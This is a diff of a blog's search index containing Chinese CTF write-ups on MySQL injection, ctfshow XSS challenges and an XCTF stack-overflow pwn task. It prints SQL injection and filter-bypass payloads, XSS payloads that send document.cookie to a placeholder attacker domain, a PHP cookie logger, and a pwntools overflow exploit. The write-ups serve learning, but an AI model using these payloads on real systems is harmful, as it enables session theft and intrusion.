@@ -12,36 +12,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL注入的姿势</title>
-    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
-<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
-<span id="more"></span>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
-<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
-<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
-<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
-<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
-<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
-<p>大致的原理和RCE中的管道运算符注入一样。</p>
-<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
-<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
-<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE中的绕过总结（持续更新中）</title>
     <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
@@ -99,39 +69,33 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfshow-xss-wp</title>
-    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
-    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
-<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
-<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+    <title>MySQL注入的姿势</title>
+    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
 <span id="more"></span>
-<p>反射型常见trick：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
-<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
-<p>不过会有各种过滤</p>
-<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
-<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.<span class="property">src</span> = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
-<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
-<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
-<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
-<p>顺利搞到管理员的cookie</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
+]]></content>
       <categories>
         <category>ctf</category>
         <category>web</category>
-        <category>wp</category>
-        <category>xss</category>
+        <category>sql</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>xss</tag>
-        <tag>wp</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -165,8 +129,44 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>wp</tag>
         <tag>buuoj</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-xss-wp</title>
+    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
+    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
+<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
+<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+<span id="more"></span>
+<p>反射型常见trick：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试#试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+<h2 id="反射型（Web316-Web326"><a href="#反射型（Web316-Web326" class="headerlink" title="反射型（Web316 - Web326)"></a>反射型（Web316 - Web326)</h2><p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
+<p>不过会有各种过滤</p>
+<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
+<p>xss平台：<a href="https://xss.pt/">https://xss.pt/</a></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.<span class="property">src</span> = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://your-domain:port/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://your-domain:port&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
+<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h3 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h3><p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
+<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
+<p>顺利搞到管理员的cookie</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Web-329"><a href="#Web-329" class="headerlink" title="Web 329"></a>Web 329</h3>]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -223,33 +223,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn-xctf-新手区wp</title>
-    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
-    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
-<p><img src="https://github.com/whistleH/blogImage/blob/main/img/blog1_100/blog0008blog0008_1.png" alt=""></p>
-<p>简单的输入提示，基本上获得不了什么信息。</p>
-<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
-<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
-<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#x40;&#112;&#x6c;&#116;">&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#x40;&#112;&#x6c;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
-<p>Python的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>pwn</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>xctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>leetcode-分治-最接近原点的K个点</title>
     <url>/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/</url>
     <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
@@ -271,6 +244,33 @@
         <tag>leetcode</tag>
         <tag>算法</tag>
         <tag>题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn-xctf-新手区wp</title>
+    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
+    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
+<p>简单的输入提示，基本上获得不了什么信息。</p>
+<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
+<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
+<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x73;&#x79;&#x73;&#x74;&#101;&#109;&#x40;&#x70;&#x6c;&#116;">&#x73;&#x79;&#x73;&#x74;&#101;&#109;&#x40;&#x70;&#x6c;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>Python的exp如下：</p>
